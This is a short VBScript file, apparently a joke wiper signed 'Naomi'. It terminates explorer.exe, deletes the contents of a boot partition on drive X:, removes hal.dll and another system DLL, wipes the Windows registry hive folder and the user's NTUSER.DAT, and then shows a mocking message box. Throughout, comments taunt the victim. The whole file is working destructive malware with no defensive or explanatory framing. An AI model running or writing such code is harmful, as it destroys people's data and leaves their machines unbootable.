On Error Resume Next ' i had to i cant even
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='explorer.EXE'")

For Each objProcess in colProcesses
	objProcess.Terminate() ' oops your desktop says bye bye
Next

Set colDisks = objWMIService.ExecQuery("SELECT * FROM Win32_DiskDrive")

For Each objDisk in colDisks
    Set colPartitions = objWMIService.ExecQuery("ASSOCIATORS OF {Win32_DiskDrive.DeviceID='" & objDisk.DeviceID & "'} WHERE AssocClass = Win32_DiskDriveToDiskPartition")
    For Each objPartition in colPartitions
        Set colLogicalDisks = objWMIService.ExecQuery("ASSOCIATORS OF {Win32_DiskPartition.DeviceID='" & objPartition.DeviceID & "'} WHERE AssocClass = Win32_LogicalDiskToPartition")
        For Each objLogicalDisk in colLogicalDisks
            If objLogicalDisk.DeviceID = "X:" Then
                Set objFSO = CreateObject("Scripting.FileSystemObject") ' oh no! you havent any boot files!
                objFSO.DeleteFolder "X:\*", true
                WScript.Echo "System Reserved Partition found on Disk " & objDisk.DeviceID & ", Partition " & objPartition.DeviceID & " - Drive letter X: assigned and contents deleted."
            End If
        Next
    Next
Next

Set objFSO = CreateObject("Scripting.FileSystemObject") ' why could we need this? hmmmmmmmmmm...

objFSO.DeleteFile "C:\Windows\System32\hal.DLL" ' who needs hardware abstraction anyway? lolz!
objFSO.DeleteFile "C:\Windows\SysWOW64\aeevts.DLL" ' funny name

' say goodbye to your precious registry
objFSO.DeleteFile "C:\Windows\System32\config\*" ' look at it, all grown up
Set objNetwork = CreateObject("WScript.Network")
strUserName = objNetwork.UserName ' oh thats who we are, good to know
objFSO.DeleteFile "C:\Users\" & strUserName & "\NTUSER.DAT" ' oopsie i accidentally deleted your registry

' tell them everything
MsgBox "Oops, Naomi deleted some important files! I hope you had backups! Oh, and by the way, you kinda dont have a registry anymore", vbOKOnly, "Naomi"
